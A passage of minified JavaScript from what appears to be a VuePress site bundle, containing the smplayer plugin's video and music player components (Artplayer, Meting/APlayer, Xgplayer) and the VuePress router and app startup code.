e.src.type="smplayerArtplayerShakaDash",m=!0,n.abrupt("break",27);case 24:return e.src.type="smplayerArtplayerWebtorrent",g=!0,n.abrupt("break",27);case 27:if(null!=(null===(s=e.src)||void 0===s?void 0:s.quality)&&e.src.quality.length>0&&e.src.quality.forEach((function(n){if(null==n.type&&(n.url.toLowerCase().endsWith(".m3u8")?n.type="m3u8":n.url.toLowerCase().endsWith(".flv")?n.type="flv":n.url.toLowerCase().endsWith(".mpd")&&(n.type="shakaDash")),null!=n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerArtplayerHls",p=!0;break;case"flv":n.type="smplayerArtplayerFlv",d=!0;break;case"dash":n.type="smplayerArtplayerDash",u=!0;break;case"shakadash":case"shaka":case"shaka-dash":n.type="smplayerArtplayerShakaDash",m=!0;break;case"webtorrent":n.type="smplayerArtplayerWebtorrent",g=!0}})),p&&Object.assign(null===(x=e.src)||void 0===x?void 0:x.customType,{smplayerArtplayerHls:function(n,e,r){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var a=t.default,o=new a;o.attachMedia(n),o.on(a.Events.MEDIA_ATTACHED,(function(){o.loadSource(e)})),r.on("destroy",(function(){o.destroy()}))}))}}),d&&Object.assign(null===(w=e.src)||void 0===w?void 0:w.customType,{smplayerArtplayerFlv:function(n,e,r){t.e(8).then(t.t.bind(null,477,7)).then((function(t){var a=t.default.createPlayer({type:"flv",url:e});a.attachMediaElement(n),a.load(),r.on("destroy",(function(){a.destroy()}))}))}}),u&&Object.assign(null===(S=e.src)||void 0===S?void 0:S.customType,{smplayerArtplayerDash:function(n,e,r){t.e(5).then(t.t.bind(null,478,7)).then((function(t){var a=t.default.MediaPlayer().create();a.initialize(n,e,!1),r.on("destroy",(function(){a.reset()}))}))}}),m&&Object.assign(null===(j=e.src)||void 0===j?void 0:j.customType,{smplayerArtplayerShakaDash:function(n,e,r){t.e(9).then(t.t.bind(null,479,7)).then((function(t){var a=new t.default.Player(n);a.load(e).then((function(){r.on("destroy",(function(){a.destroy()}))}))}))}}),g&&Object.assign(null===(E=e.src)||void 0===E?void 0:E.customType,{smplayerArtplayerWebtorrent:function(n,e,r){t.e(10).then(t.t.bind(null,480,7)).then((function(t){var a=new(0,t.default);a.add(e,(function(e){e.files.find((function(n){return n.name.endsWith(".mp4")})).renderTo(n),r.on("destroy",(function(){a.destroy()}))}))}))}}),null===(c=e.src)||void 0===c||!c.customInit){n.next=39;break}return n.next=36,e.src.customInit(l,e.src).then((function(n){return e.player=n,e.player}));case 36:n.t1=n.sent,n.next=40;break;case 39:n.t1=new l(e.src);case 40:return e.player=n.t1,n.abrupt("return",e.player);case 42:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}(),uc=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,0]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=n.$refs.sbplayer,r=sc()({},n.on),a=Object(rc.a)(Object(rc.a)({},sc()({url:"",fullscreen:!0,autoSize:!0,setting:!0,playbackRate:!0,whitelist:["*"],moreVideoAttr:{preload:"auto"}},n.src)),{},{container:t}),n.player=new dc(a),e.next=6,n.player.InitPlayer();case 6:n.player.AddOnEvent(r),t.style.height=t.scrollWidth*n.height[0]+n.height[1]+"px";case 8:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}});t(216);function mc(n,e){return(mc=Object.setPrototypeOf||function(n,e){return n.__proto__=e,n})(n,e)}function gc(n,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");n.prototype=Object.create(e&&e.prototype,{constructor:{value:n,writable:!0,configurable:!0}}),Object.defineProperty(n,"prototype",{writable:!1}),e&&mc(n,e)}t(217),t(218);function fc(n){return(fc=Object.setPrototypeOf?Object.getPrototypeOf:function(n){return n.__proto__||Object.getPrototypeOf(n)})(n)}function bc(n,e){if(e&&("object"===Pi(e)||"function"==typeof e))return e;if(void 0!==e)throw new TypeError("Derived constructors may only return object or undefined");return function(n){if(void 0===n)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return n}(n)}function hc(n){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(n){return!1}}();return function(){var t,r=fc(n);if(e){var a=fc(this).constructor;t=Reflect.construct(r,arguments,a)}else t=r.apply(this,arguments);return bc(this,t)}}t(238),t(239);var vc=function(n){gc(a,n);var e,t=hc(a);function a(){return ls(this,a),t.call(this)}return ds(a,[{key:"InitMeting",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e,t,a,o,i,s,c=this,l=arguments;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return e=l.length>0&&void 0!==l[0]?l[0]:{},t=l.length>1?l[1]:void 0,a=[],o=e.audio||[],i=e.list||[],(e.id||e.auto)&&(i=[{id:e.id,server:e.server,type:e.type,auth:e.auth,auto:e.auto}].concat(i.map((function(n){return{id:n.id,server:n.server,type:n.type,auth:n.auth,auto:n.auto}})))),i&&i.length>0&&i.map((function(n){if(n.id||n.auto){var t=c.ParseMeting({id:n.id,server:n.server,type:n.type,auth:n.auth,auto:n.auto},e.api);t&&a.push(t)}})),s=a.map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return n.next=2,fetch(e);case 2:return n.abrupt("return",n.sent.json());case 3:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()),n.next=10,Promise.all(s).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return r.map((function(n){o=o.concat(n.map((function(n){return{name:(null==n?void 0:n.name)||(null==n?void 0:n.title)||"Audio name",artist:(null==n?void 0:n.artist)||(null==n?void 0:n.author)||"Audio artist",url:null==n?void 0:n.url,cover:(null==n?void 0:n.cover)||(null==n?void 0:n.pic),lrc:(null==n?void 0:n.lrc)||(null==n?void 0:n.lyric)||"",type:(null==n?void 0:n.type)||"auto"}})))})),a={container:t,audio:o,fixed:e.fixed,mini:e.mini,autoplay:e.autoplay,loop:e.loop,order:e.order,preload:e.preload,volume:e.volume,mutex:e.mutex,lrcType:e.lrcType,listFolded:e.listFolded,listMaxHeight:e.listMaxHeight,storageName:e.storageName},c.src=a,n.abrupt("return",c.InitPlayer());case 4:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 10:return n.abrupt("return",n.sent);case 11:case"end":return n.stop()}}),n)}))),function(){return e.apply(this,arguments)})},{key:"ParseMeting",value:function(n,e){return n&&n.auto&&(n=this.ParseLink(n.auto)),n&&n.server&&n.type&&n.id?e.replace(":server",n.server).replace(":type",n.type).replace(":id",n.id).replace(":auth",n.auth).replace(":r",Math.random().toString()):""}},{key:"ParseLink",value:function(n){for(var e=0,t=[["music.163.com.*song.*id=(\\d+)","netease","song"],["music.163.com.*album.*id=(\\d+)","netease","album"],["music.163.com.*artist.*id=(\\d+)","netease","artist"],["music.163.com.*playlist.*id=(\\d+)","netease","playlist"],["music.163.com.*discover/toplist.*id=(\\d+)","netease","playlist"],["y.qq.com.*song/(\\w+).html","tencent","song"],["y.qq.com.*songDetail/(\\w+)","tencent","song"],["y.qq.com.*album/(\\w+).html","tencent","album"],["y.qq.com.*singer/(\\w+).html","tencent","artist"],["y.qq.com.*playsquare/(\\w+).html","tencent","playlist"],["y.qq.com.*playlist/(\\w+).html","tencent","playlist"],["xiami.com.*song/(\\w+)","xiami","song"],["xiami.com.*album/(\\w+)","xiami","album"],["xiami.com.*artist/(\\w+)","xiami","artist"],["xiami.com.*collect/(\\w+)","xiami","playlist"]];e<t.length;e++){var r=t[e],a=new RegExp(r[0]).exec(n);if(a)return{server:r[1],type:r[2],id:a[1]}}return console.error("æ æ³è§£æçé¾æ¥: ".concat(n,"ï¼è¯·æ£æ¥é¾æ¥æ¯å¦ä¹¦åæ­£ç¡®")),{}}}]),a}(lc),yc=Ba.extend({props:{id:{required:!1,type:String,default:""},server:{required:!1,type:String,default:"tencent"},type:{required:!1,type:String,default:"song"},auto:{required:!1,type:String,default:""},fixed:{required:!1,type:Boolean,default:!1},mini:{required:!1,type:Boolean,default:!1},autoplay:{required:!1,type:Boolean,default:!1},theme:{required:!1,type:String,default:"#2980b9"},loop:{required:!1,type:String,default:"all"},order:{required:!1,type:String,default:"list"},preload:{required:!1,type:String,default:"auto"},volume:{required:!1,type:Number,default:.7},mutex:{required:!1,type:Boolean,default:!0},lrcType:{required:!1,type:Number,default:3},listFolded:{required:!1,type:Boolean,default:!1},listMaxHeight:{required:!1,type:String,default:"340px"},storageName:{required:!1,type:String,default:"vuepress-plugin-smplayer"},api:{required:!1,type:String,default:"https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&r=:r"},audio:{required:!1,type:Array},list:{required:!1,type:Array}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer"})])},data:function(){return{meting:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=n.$props,n.meting=new vc,e.next=4,n.meting.InitMeting(t,n.$refs.sbplayer);case 4:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.meting)||void 0===n||n.DestroyPlayer()}}),kc=function(){function n(e){ls(this,n),Object(ac.a)(this,"src",void 0),Object(ac.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e,a,o,i,s,c=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=24;break}if(null!==(e=this.src)&&void 0!==e&&e.type||"string"!=typeof(null===(a=this.src)||void 0===a?void 0:a.url)||(this.src.url.toLowerCase().endsWith(".m3u8")?this.src.type="hls":this.src.url.toLowerCase().endsWith(".flv")?this.src.type="flv":this.src.url.toLowerCase().endsWith(".mpd")&&(this.src.type="shaka")),s=t.e(0).then(t.t.bind(null,389,7)),null===(o=this.src)||void 0===o||!o.type||"string"!=typeof this.src.type){n.next=20;break}n.t0=this.src.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?7:"flv"===n.t0?9:"dash"===n.t0?11:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?13:"music"===n.t0?15:17;break;case 7:return i=Promise.all([Promise.all([t.e(0),t.e(82)]).then(t.t.bind(null,484,7)),s]),n.abrupt("break",18);case 9:return i=Promise.all([Promise.all([t.e(0),t.e(81)]).then(t.t.bind(null,485,7)),s]),n.abrupt("break",18);case 11:return i=Promise.all([Promise.all([t.e(0),t.e(80)]).then(t.t.bind(null,486,7)),s]),n.abrupt("break",18);case 13:return i=Promise.all([Promise.all([t.e(0),t.e(84)]).then(t.t.bind(null,487,7)),s]),n.abrupt("break",18);case 15:return i=Promise.all([Promise.all([t.e(0),t.e(83)]).then(t.t.bind(null,488,7)),s]),n.abrupt("break",18);case 17:i=t.e(0).then(t.t.bind(null,389,7));case 18:n.next=21;break;case 20:i=Promise.all([s]);case 21:return n.next=23,i.then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,a;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(r=Object(Wi.a)(e,1),a=r[0].default,null===(t=c.src)||void 0===t||!t.customInit){n.next=7;break}return n.next=4,c.src.customInit(a,c.src).then((function(n){return n}));case 4:n.t0=n.sent,n.next=8;break;case 7:n.t0=new a(c.src);case 8:return c.player=n.t0,n.abrupt("return",c.player);case 10:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 23:return n.abrupt("return",n.sent);case 24:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}(),xc=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return{src:{url:"",fluid:!0,fitVideoSize:"auto"},width:"100%",on:{}}.height},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sc()({},n.on),r=Object(rc.a)(Object(rc.a)({},sc()({url:"",fluid:!0,fitVideoSize:"auto"},n.src)),{},{el:n.$refs.sbplayer}),n.player=new kc(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t);case 6:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),wc=[function(n){var e=n.Vue,t=(n.options,n.router,n.siteData);t.pages.map((function(n){var e=n.frontmatter,r=e.date,a=e.author;"string"==typeof r&&"Z"===r.charAt(r.length-1)&&(n.frontmatter.date=function(n){n instanceof Date||(n=new Date(n));return"".concat(n.getUTCFullYear(),"-").concat(nc(n.getUTCMonth()+1),"-").concat(nc(n.getUTCDate())," ").concat(nc(n.getUTCHours()),":").concat(nc(n.getUTCMinutes()),":").concat(nc(n.getUTCSeconds()))}(r)),a?n.author=a:t.themeConfig.author&&(n.author=t.themeConfig.author)})),e.mixin(Qs)},{},function(n){n.Vue.mixin({computed:{$dataBlock:function(){return this.$options.__data__block__}}})},{},{},function(n){var e=n.Vue;e.component("Bilibili",ec),e.component("Xigua",tc),e.component("DPlayer",cc),e.component("APlayer",pc),e.component("Artplayer",uc),e.component("Meting",yc),e.component("metingJs",yc),e.component("Xgplayer",xc)}],Sc=[];t(148);var jc=function(n){gc(t,n);var e=hc(t);function t(){return ls(this,t),e.apply(this,arguments)}return ds(t)}(function(){function n(){ls(this,n),this.store=new Ba({data:{state:{}}})}return ds(n,[{key:"$get",value:function(n){return this.store.state[n]}},{key:"$set",value:function(n,e){Ba.set(this.store.state,n,e)}},{key:"$emit",value:function(){var n;(n=this.store).$emit.apply(n,arguments)}},{key:"$on",value:function(){var n;(n=this.store).$on.apply(n,arguments)}}]),n}());Object.assign(jc.prototype,{getPageAsyncComponent:Fi,getLayoutAsyncComponent:Ui,getAsyncComponent:Vi,getVueComponent:Gi});var Ec={install:function(n){var e=new jc;n.$vuepress=e,n.prototype.$vuepress=e}};function Pc(n){n.beforeEach((function(e,t,r){if(Ac(n,e.path))r();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){var a=e.path.replace(/\/$/,"")+".html";Ac(n,a)?r(a):r()}else r();else{var o=e.path+"/",i=e.path+".html";Ac(n,i)?r(i):Ac(n,o)?r(o):r()}}))}function Ac(n,e){var t=e.toLowerCase();return n.options.routes.some((function(n){return n.path.toLowerCase()===t}))}var Tc={props:{pageKey:String,slotKey:{type:String,default:"default"}},render:function(n){var e=this.pageKey||this.$parent.$page.key;return Ji("pageKey",e),Ba.component(e)||Ba.component(e,Fi(e)),Ba.component(e)?n(e):n("")}},Cc={functional:!0,props:{slotKey:String,required:!0},render:function(n,e){var t=e.props,r=e.slots;return n("div",{class:["content__".concat(t.slotKey)]},r()[t.slotKey])}},Ic={computed:{openInNewWindowTitle:function(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},Rc=(t(386),t(387),Object(Hs.a)(Ic,(function(){var n=this.$createElement,e=this._self._c||n;return e("span",[e("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[e("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),e("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),e("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports);function _c(){return(_c=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,a,o;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return t="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:Ks.routerBase||Ks.base,Pc(r=new ji({base:t,mode:"history",fallback:!1,routes:Ws,scrollBehavior:function(n,e,t){return t||(n.hash?!Ba.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})}})),a={},n.prev=4,n.next=7,Promise.all(wc.filter((function(n){return"function"==typeof n})).map((function(n){return n({Vue:Ba,options:a,router:r,siteData:Ks,isServer:e})})));case 7:n.next=12;break;case 9:n.prev=9,n.t0=n.catch(4),console.error(n.t0);case 12:return o=new Ba(Object.assign(a,{router:r,render:function(n){return n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Sc.map((function(e){return n(e)})))])}})),n.abrupt("return",{app:o,router:r});case 14:case"end":return n.stop()}}),n,null,[[4,9]])})))).apply(this,arguments)}Ba.config.productionTip=!1,Ba.use(ji),Ba.use(Ec),Ba.mixin(function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:Ba;Ei(e),t.$vuepress.$set("siteData",e);var r=n(t.$vuepress.$get("siteData")),a=new r,o=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(a)),i={};return Object.keys(o).reduce((function(n,e){return e.startsWith("$")&&(n[e]=o[e].get),n}),i),{computed:i}}((function(n){return function(){function e(){ls(this,e)}return ds(e,[{key:"setPage",value:function(n){this.__page=n}},{key:"$site",get:function(){return n}},{key:"$themeConfig",get:function(){return this.$site.themeConfig}},{key:"$frontmatter",get:function(){return this.$page.frontmatter}},{key:"$localeConfig",get:function(){var n,e,t=this.$site.locales,r=void 0===t?{}:t;for(var a in r)"/"===a?e=r[a]:0===this.$page.path.indexOf(a)&&(n=r[a]);return n||e||{}}},{key:"$siteTitle",get:function(){return this.$localeConfig.title||this.$site.title||""}},{key:"$canonicalUrl",get:function(){var n=this.$page.frontmatter.canonicalUrl;return"string"==typeof n&&n}},{key:"$title",get:function(){var n=this.$page,e=this.$page.frontmatter.metaTitle;if("string"==typeof e)return e;var t=this.$siteTitle,r=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?r?r+" | "+t:t:r||"VuePress"}},{key:"$description",get:function(){var n=function(n){if(n){var e=n.filter((function(n){return"description"===n.name}))[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}},{key:"$lang",get:function(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}},{key:"$localePath",get:function(){return this.$localeConfig.path||"/"}},{key:"$themeLocaleConfig",get:function(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}},{key:"$page",get:function(){return this.__page?this.__page:function(n,e){for(var t=0;t<n.length;t++){var r=n[t];if(r.path.toLowerCase()===e.toLowerCase())return r}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}}]),e}()}),Ks)),Ba.component("Content",Tc),Ba.component("ContentSlotsDistributor",Cc),Ba.component("OutboundLink",Rc),Ba.component("ClientOnly",{functional:!0,render:function(n,e){var t=e.parent,r=e.children;if(t._isMounted)return r;t.$once("hook:mounted",(function(){t.$forceUpdate()}))}}),Ba.component("Layout",Ui("Layout")),Ba.component("NotFound",Ui("NotFound")),Ba.prototype.$withBase=function(n){var e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.7",hash:"e94ae3e"},function(n){return _c.apply(this,arguments)}(!1).then((function(n){var e=n.app;n.router.onReady((function(){e.$mount("#app")}))}))}]);